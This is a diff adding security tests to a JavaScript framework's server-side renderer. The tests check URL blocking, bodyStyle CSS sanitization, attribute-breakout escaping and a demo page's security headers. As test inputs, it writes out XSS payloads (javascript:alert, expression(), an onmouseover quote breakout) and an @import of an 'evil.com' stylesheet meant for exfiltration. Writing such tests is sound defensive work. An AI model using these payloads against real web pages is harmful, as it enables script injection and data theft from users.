@@ -1,7 +1,13 @@
 import { describe, test, expect } from 'bun:test'
+import { readFile } from 'node:fs/promises'
+import { join, dirname } from 'node:path'
+import { fileURLToPath } from 'node:url'
 import { defineComponent, renderToString, createPortal } from '../src/index.js'
 import { jsxDEV } from '../src/jsx-dev-runtime.js'
 import { h } from '../src/syntax/h.js'
+
+const repoRoot = fileURLToPath(new URL('..', import.meta.url))
+const ssrPagePath = join(repoRoot, 'demo', 'ssr-page.tsx')
 
 describe('SSR: renderToString', () => {
   test('genera HTML base válido', async () => {
@@ -219,6 +225,24 @@ describe('SSR: attrs security policy', () => {
     expect(html).not.toContain('href="javascript:alert(1)"')
   })
 
+  test('SSR output blocks protocol-relative URLs (slash and backslash variants)', async () => {
+    for (const payload of ['//evil.com', '\\\\evil.com', '/\\evil.com', '\\/evil.com']) {
+      const App = defineComponent(() => ({
+        type: 'element' as const,
+        tag: 'a',
+        attrs: {
+          href: payload,
+        },
+        children: [{ type: 'text' as const, content: 'Dangerous link' }],
+      }))
+
+      const html = await renderToString(App)
+
+      expect(html).toContain('href="#blocked"')
+      expect(html).not.toContain(`href="${payload}"`)
+    }
+  })
+
   // --- SSR/Client consistency (eliminate-next-anonymous-id-global) ---
 
   test('anonymous component display name is deterministic across simulated SSR and client init', async () => {
@@ -239,5 +263,136 @@ describe('SSR: attrs security policy', () => {
     // Both should resolve to the same deterministic display name
     expect(ssrComponent.displayName).toMatch(/^Component#[0-9a-f]{8}$/)
     expect(ssrComponent.displayName).toBe(clientComponent.displayName)
+  })
+})
+
+describe('SSR: bodyStyle sanitization', () => {
+  test('bodyStyle with url(data:...) is sanitized', async () => {
+    const App = defineComponent(() => ({
+      type: 'element' as const,
+      tag: 'div',
+      children: [{ type: 'text' as const, content: 'test' }],
+    }))
+
+    const html = await renderToString(App, {
+      metadata: {
+        bodyStyle: 'background: url(data:text/html,<script>alert(1)</script>)',
+      },
+    })
+
+    // url( is stripped, neutralizing the exfiltration vector
+    expect(html).not.toContain('url(data:text/html')
+  })
+
+  test('bodyStyle with @import is sanitized', async () => {
+    const App = defineComponent(() => ({
+      type: 'element' as const,
+      tag: 'div',
+      children: [{ type: 'text' as const, content: 'test' }],
+    }))
+
+    const html = await renderToString(App, {
+      metadata: {
+        bodyStyle: '@import url("https://evil.com/steal.css")',
+      },
+    })
+
+    expect(html).not.toContain('@import')
+  })
+
+  test('bodyStyle with expression() is sanitized', async () => {
+    const App = defineComponent(() => ({
+      type: 'element' as const,
+      tag: 'div',
+      children: [{ type: 'text' as const, content: 'test' }],
+    }))
+
+    const html = await renderToString(App, {
+      metadata: {
+        bodyStyle: 'width: expression(alert(1))',
+      },
+    })
+
+    expect(html).not.toContain('expression')
+  })
+
+  test('bodyStyle with javascript: is sanitized', async () => {
+    const App = defineComponent(() => ({
+      type: 'element' as const,
+      tag: 'div',
+      children: [{ type: 'text' as const, content: 'test' }],
+    }))
+
+    const html = await renderToString(App, {
+      metadata: {
+        bodyStyle: 'background: javascript:alert(1)',
+      },
+    })
+
+    expect(html).not.toContain('javascript:')
+  })
+
+  test('bodyStyle preserves legitimate CSS properties', async () => {
+    const App = defineComponent(() => ({
+      type: 'element' as const,
+      tag: 'div',
+      children: [{ type: 'text' as const, content: 'test' }],
+    }))
+
+    const html = await renderToString(App, {
+      metadata: {
+        bodyStyle: 'color: red; font-size: 16px; margin: 0;',
+      },
+    })
+
+    expect(html).toContain('color: red')
+    expect(html).toContain('font-size: 16px')
+    expect(html).toContain('margin: 0')
+  })
+
+  test('bodyStyle cannot break out of the style attribute (HTML-escaped)', async () => {
+    const App = defineComponent(() => ({
+      type: 'element' as const,
+      tag: 'div',
+      children: [{ type: 'text' as const, content: 'test' }],
+    }))
+
+    const html = await renderToString(App, {
+      metadata: {
+        bodyStyle: 'red" onmouseover="alert(1)',
+      },
+    })
+
+    // The double quote must be HTML-escaped so it cannot terminate style="..."
+    // and inject a new attribute. The whole payload stays inside the style value.
+    expect(html).toContain('style="red&quot; onmouseover=&quot;alert(1)"')
+    // No raw (unescaped) quote breakout that would create a live attribute.
+    expect(html).not.toContain('red" onmouseover="alert(1)"')
+  })
+})
+
+describe('SSR demo: security headers', () => {
+  test('demo/ssr-page.tsx defines SECURITY_HEADERS constant', async () => {
+    const source = await readFile(ssrPagePath, 'utf8')
+    expect(source).toContain("const SECURITY_HEADERS: Record<string, string> = {")
+  })
+
+  test('SECURITY_HEADERS includes all five required headers', async () => {
+    const source = await readFile(ssrPagePath, 'utf8')
+    expect(source).toContain("'X-Content-Type-Options': 'nosniff'")
+    expect(source).toContain("'X-Frame-Options': 'SAMEORIGIN'")
+    expect(source).toContain("'Referrer-Policy': 'strict-origin-when-cross-origin'")
+    expect(source).toContain("'Content-Security-Policy'")
+    expect(source).toContain("'Permissions-Policy': 'geolocation=(), camera=(), microphone=()'")
+  })
+
+  test('SECURITY_HEADERS CSP includes style-src for inline SSR styles', async () => {
+    const source = await readFile(ssrPagePath, 'utf8')
+    expect(source).toContain("'unsafe-inline'")
+  })
+
+  test('renderSSRPage merges SECURITY_HEADERS into Response headers', async () => {
+    const source = await readFile(ssrPagePath, 'utf8')
+    expect(source).toMatch(/\.\.\.SECURITY_HEADERS/)
   })
 })
